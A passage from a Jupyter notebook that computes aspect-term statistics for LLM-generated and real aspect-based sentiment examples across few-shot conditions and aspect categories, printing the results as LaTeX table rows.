    "              round_number(np.mean(tags_from_splits_count), 0)),  # n aspects\n",
    "          \"&\", add_thousand_dots(\n",
    "              round_number(np.mean(tags_from_splits_count_implicit) / np.mean(tags_from_splits_count) * 100, 1)) + \"\\\\pm\" + add_thousand_dots(round_number(np.std([a / b * 100 for a, b in zip(\n",
    "              tags_from_splits_count_implicit, tags_from_splits_count)]), 2)) + \"\\\\%\",\n",
    "          \"&\", add_thousand_dots(\n",
    "              round_number(np.mean(tags_from_splits_count_explicit), 2)),  # n aspects explicit\n",
    "          \"&\", add_thousand_dots(\n",
    "              round_number(np.mean(count_unique_aspect_terms_in_split), 1)),  # n unique\n",
    "          \"&\", add_thousand_dots(\n",
    "              round_number(np.mean(count_unique_aspect_terms_in_100_aspect_terms), 1)),\n",
    "          \"&\", add_thousand_dots(\n",
    "              round_number(np.mean(count_unique_aspect_terms_in_200_aspect_terms), 1)),\n",
    "          \"&\", print_k_unique_at(\n",
    "              count_unique_aspect_terms_in_500_aspect_terms, 500),\n",
    "          \"&\", print_k_unique_at(\n",
    "              count_unique_aspect_terms_in_1000_aspect_terms, 1000), \"\\\\\\\\\")\n",
    "print(\"\\\\hline\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Aspect Term Analysis (With Aspect Category)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Synth Examples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T09:45:16.607293Z",
     "iopub.status.busy": "2024-02-15T09:45:16.607150Z",
     "iopub.status.idle": "2024-02-15T09:45:16.610258Z",
     "shell.execute_reply": "2024-02-15T09:45:16.609716Z"
    }
   },
   "outputs": [],
   "source": [
    "def print_k_unique_at(unique_counts, max_count):\n",
    "    if None in unique_counts:\n",
    "        return \"-\"\n",
    "    return add_thousand_dots(round_number(np.mean(unique_counts), 1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T09:45:16.614149Z",
     "iopub.status.busy": "2024-02-15T09:45:16.613991Z",
     "iopub.status.idle": "2024-02-15T10:25:26.607862Z",
     "shell.execute_reply": "2024-02-15T10:25:26.607262Z"
    }
   },
   "outputs": [],
   "source": [
    "for idx_llm, llm in enumerate(LLMS):\n",
    "    for idx_fsc, few_shot_condition in enumerate(FS_CONDITIONS):\n",
    "        for idx_ac, aspect_category in enumerate(ASPECT_CATEGORIES):\n",
    "            for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "                tags_from_splits_count = []\n",
    "                tags_from_splits_count_implicit = []\n",
    "                tags_from_splits_count_explicit = []\n",
    "                count_unique_aspect_terms_in_split = []\n",
    "                count_unique_aspect_terms_in_10_aspect_terms = []\n",
    "                count_unique_aspect_terms_in_50_aspect_terms = []\n",
    "                count_unique_aspect_terms_in_100_aspect_terms = []\n",
    "                count_unique_aspect_terms_in_200_aspect_terms = []\n",
    "                count_unique_aspect_terms_in_300_aspect_terms = []\n",
    "                for it in range(6):\n",
    "                    tags = [tag for k in range(\n",
    "                        int(n_sample / 500)) for example in dataset[\"synth\"][llm][few_shot_condition][it][k] for tag in example[\"tags\"] if tag[\"label\"] == aspect_category]\n",
    "                    tags_explicit = [tag[\"text\"]\n",
    "                                     for tag in tags if tag[\"type\"] == \"label-explicit\"]\n",
    "                    tags_from_splits_count.append(len(tags))\n",
    "                    tags_from_splits_count_explicit.append(\n",
    "                        len([tag for tag in tags if tag[\"type\"] == \"label-explicit\"]))\n",
    "                    tags_from_splits_count_implicit.append(\n",
    "                        len([tag for tag in tags if tag[\"type\"] == \"label-implicit\"]))\n",
    "\n",
    "                    unique_tags = len(set(tags_explicit))\n",
    "\n",
    "\n",
    "                    if len(tags_explicit) >= 10:\n",
    "                        count_unique_aspect_terms_in_10_aspect_terms.append(\n",
    "                            get_avg_unique_words_in_k_words(tags_explicit, n_selection=10))\n",
    "                    else:\n",
    "                        count_unique_aspect_terms_in_10_aspect_terms.append(None)\n",
    "\n",
    "                    if len(tags_explicit) >= 50:\n",
    "                        count_unique_aspect_terms_in_50_aspect_terms.append(\n",
    "                            get_avg_unique_words_in_k_words(tags_explicit, n_selection=50))\n",
    "                    else:\n",
    "                        count_unique_aspect_terms_in_50_aspect_terms.append(None)\n",
    "\n",
    "                    if len(tags_explicit) >= 100:\n",
    "                        count_unique_aspect_terms_in_100_aspect_terms.append(\n",
    "                            get_avg_unique_words_in_k_words(tags_explicit, n_selection=100))\n",
    "                    else:\n",
    "                        count_unique_aspect_terms_in_100_aspect_terms.append(None)\n",
    "\n",
    "                    if len(tags_explicit) >= 200:\n",
    "                        count_unique_aspect_terms_in_200_aspect_terms.append(\n",
    "                            get_avg_unique_words_in_k_words(tags_explicit, n_selection=200))\n",
    "                    else:\n",
    "                        count_unique_aspect_terms_in_200_aspect_terms.append(None)\n",
    "\n",
    "                    if len(tags_explicit) >= 300:\n",
    "                        count_unique_aspect_terms_in_300_aspect_terms.append(\n",
    "                            get_avg_unique_words_in_k_words(tags_explicit, n_selection=300))\n",
    "                    else:\n",
    "                        count_unique_aspect_terms_in_300_aspect_terms.append(None)                    \n",
    "\n",
    "                    count_unique_aspect_terms_in_split.append(unique_tags)\n",
    "\n",
    "                llm_print = \"\\multirow{30}{*}{\\\\textbf{\" + \\\n",
    "                    LLMS_ENCODED[llm] + \\\n",
    "                    \"}}\" if idx_sample == 0 and idx_fsc == 0 and idx_ac == 0 else \"\"\n",
    "                fs_condition_print = \"\\multirow{15}{*}{\" + \\\n",
    "                    ENCODE_CONDITION[few_shot_condition] + \\\n",
    "                    \"}\" if idx_sample == 0 and idx_ac == 0 else \"\"\n",
    "                ac_print = \"\\multirow{3}{*}{\\\\texttt{\" + \\\n",
    "                    aspect_category + \"}}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "                # print(idx_llm, idx_fsc, idx_ac, idx_sample)\n",
    "\n",
    "                print(llm_print, \"&\", fs_condition_print, \"&\", ac_print,\n",
    "                      \"&\", add_thousand_dots(n_sample),\n",
    "                      \"&\", add_thousand_dots(\n",
    "                          round_number(np.mean(tags_from_splits_count), 1)),\n",
    "                      \"&\", add_thousand_dots(\n",
    "                          round_number(np.mean(tags_from_splits_count_implicit) / np.mean(tags_from_splits_count) * 100, 1)) + \"\\\\pm\" + add_thousand_dots(round_number(np.std([a / b * 100 for a, b in zip(\n",
    "                          tags_from_splits_count_implicit, tags_from_splits_count)]), 2)) + \"\\\\%\",\n",
    "                      \"&\", add_thousand_dots(\n",
    "                          round_number(np.mean(tags_from_splits_count_explicit), 1)),\n",
    "                      \"&\", add_thousand_dots(round_number(\n",
    "                          np.mean(count_unique_aspect_terms_in_split), 2)),\n",
    "                      \"&\", print_k_unique_at(count_unique_aspect_terms_in_10_aspect_terms, 10), \n",
    "                      \"&\", print_k_unique_at(count_unique_aspect_terms_in_50_aspect_terms, 50),\n",
    "                      \"&\", print_k_unique_at(count_unique_aspect_terms_in_100_aspect_terms, 100),\n",
    "                      \"&\", print_k_unique_at(count_unique_aspect_terms_in_200_aspect_terms, 200),\n",
    "                      \"&\", print_k_unique_at(count_unique_aspect_terms_in_300_aspect_terms, 300), \"\\\\\\\\\")\n",
    "            # print(idx_llm, idx_fsc, idx_ac)\n",
    "            if idx_fsc == 1 and idx_ac == 4:\n",
    "                print(\"\\\\hline\")\n",
    "            elif idx_ac == 4:\n",
    "                print(\"\\\\cline{2-13}\")\n",
    "            else:\n",
    "                print(\n",
    "                    \"\\\\arrayrulecolor{gray}\\cline{3-13}\\\\arrayrulecolor{black}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Real Examples"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2024-02-15T10:25:26.611805Z",
     "iopub.status.busy": "2024-02-15T10:25:26.611663Z",
     "iopub.status.idle": "2024-02-15T10:34:31.115691Z",
     "shell.execute_reply": "2024-02-15T10:34:31.115105Z"
    }
   },
   "outputs": [],
   "source": [
    "for idx_ac, aspect_category in enumerate(ASPECT_CATEGORIES):\n",
    "    for idx_sample, n_sample in enumerate([500, 1000, 1500]):\n",
    "        tags_from_splits_count = []\n",
    "        tags_from_splits_count_implicit = []\n",
    "        tags_from_splits_count_explicit = []\n",
    "        count_unique_aspect_terms_in_split = []\n",
    "        count_unique_aspect_terms_in_10_aspect_terms = []\n",
    "        count_unique_aspect_terms_in_50_aspect_terms = []\n",
    "        count_unique_aspect_terms_in_100_aspect_terms = []\n",
    "        count_unique_aspect_terms_in_200_aspect_terms = []\n",
    "        count_unique_aspect_terms_in_300_aspect_terms = []\n",
    "\n",
    "        for it in range(6):\n",
    "            tags = [tag for k in range(int(n_sample / 500))\n",
    "                    for example in dataset[\"real\"][it][k] for tag in example[\"tags\"] if tag[\"label\"] == aspect_category]\n",
    "            tags_explicit = [tag[\"text\"]\n",
    "                             for tag in tags if tag[\"type\"] == \"label-explicit\"]\n",
    "            tags_from_splits_count.append(len(tags))\n",
    "            tags_from_splits_count_explicit.append(\n",
    "                len([tag for tag in tags if tag[\"type\"] == \"label-explicit\"]))\n",
    "            tags_from_splits_count_implicit.append(\n",
    "                len([tag for tag in tags if tag[\"type\"] == \"label-implicit\"]))\n",
    "\n",
    "            unique_tags = len(set(tags_explicit))\n",
    "\n",
    "            if len(tags_explicit) >= 10:\n",
    "                count_unique_aspect_terms_in_10_aspect_terms.append(\n",
    "                    get_avg_unique_words_in_k_words(tags_explicit, n_selection=10))\n",
    "            else:\n",
    "                count_unique_aspect_terms_in_10_aspect_terms.append(None)\n",
    "\n",
    "            if len(tags_explicit) >= 50:\n",
    "                count_unique_aspect_terms_in_50_aspect_terms.append(\n",
    "                    get_avg_unique_words_in_k_words(tags_explicit, n_selection=50))\n",
    "            else:\n",
    "                count_unique_aspect_terms_in_50_aspect_terms.append(None)\n",
    "\n",
    "            if len(tags_explicit) >= 100:\n",
    "                count_unique_aspect_terms_in_100_aspect_terms.append(\n",
    "                    get_avg_unique_words_in_k_words(tags_explicit, n_selection=100))\n",
    "            else:\n",
    "                count_unique_aspect_terms_in_100_aspect_terms.append(None)\n",
    "\n",
    "            if len(tags_explicit) >= 200:\n",
    "                count_unique_aspect_terms_in_200_aspect_terms.append(\n",
    "                    get_avg_unique_words_in_k_words(tags_explicit, n_selection=200))\n",
    "            else:\n",
    "                count_unique_aspect_terms_in_200_aspect_terms.append(None)\n",
    "\n",
    "            if len(tags_explicit) >= 300:\n",
    "                count_unique_aspect_terms_in_300_aspect_terms.append(\n",
    "                    get_avg_unique_words_in_k_words(tags_explicit, n_selection=300))\n",
    "            else:\n",
    "                count_unique_aspect_terms_in_300_aspect_terms.append(None)\n",
    "\n",
    "            count_unique_aspect_terms_in_split.append(unique_tags)\n",
    "\n",
    "        # print(idx_ac, idx_sample)\n",
    "        data_source_print = \"\\multirow{15}{*}{\\\\textbf{Real Examples}}\" if idx_sample == 0 and idx_ac == 0 else \"\"\n",
    "        fs_condition_print = \"\\multirow{15}{*}{-}\" if idx_sample == 0 and idx_ac == 0 else \"\"\n",
    "        ac_print = \"\\multirow{3}{*}{\\\\texttt{\" + \\\n",
    "            aspect_category + \"}}\" if idx_sample == 0 else \"\"\n",
    "\n",
    "        print(data_source_print, \"&\", fs_condition_print, \"&\", ac_print,\n",
    "              \"&\", add_thousand_dots(n_sample),\n",
    "              \"&\", add_thousand_dots(\n",
    "                  round_number(np.mean(tags_from_splits_count), 1)),\n",
    "              \"&\", add_thousand_dots(\n",
    "                  round_number(np.mean(tags_from_splits_count_implicit) / np.mean(tags_from_splits_count) * 100, 1)) + \"\\\\pm\" + add_thousand_dots(round_number(np.std([a / b * 100 for a, b in zip(\n",
    "                  tags_from_splits_count_implicit, tags_from_splits_count)]), 2)) + \"\\\\%\",\n",
    "              \"&\", add_thousand_dots(\n",
    "                  round_number(np.mean(tags_from_splits_count_explicit), 1)),\n",
    "              \"&\", add_thousand_dots(round_number(\n",
    "                  np.mean(count_unique_aspect_terms_in_split), 2)),\n",
    "              \"&\", print_k_unique_at(\n",
    "                  count_unique_aspect_terms_in_10_aspect_terms, 10),\n",
    "              \"&\", print_k_unique_at(\n",
    "                  count_unique_aspect_terms_in_50_aspect_terms, 50),\n",
    "              \"&\", print_k_unique_at(\n",
    "                  count_unique_aspect_terms_in_100_aspect_terms, 100),\n",
    "              \"&\", print_k_unique_at(\n",
    "                  count_unique_aspect_terms_in_200_aspect_terms, 200),\n",
    "              \"&\", print_k_unique_at(count_unique_aspect_terms_in_300_aspect_terms, 300), \"\\\\\\\\\")\n",
    "    print(\"\\\\arrayrulecolor{gray}\\cline{3-13}\\\\arrayrulecolor{black}\")\n",
    "print(\"\\\\hline\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
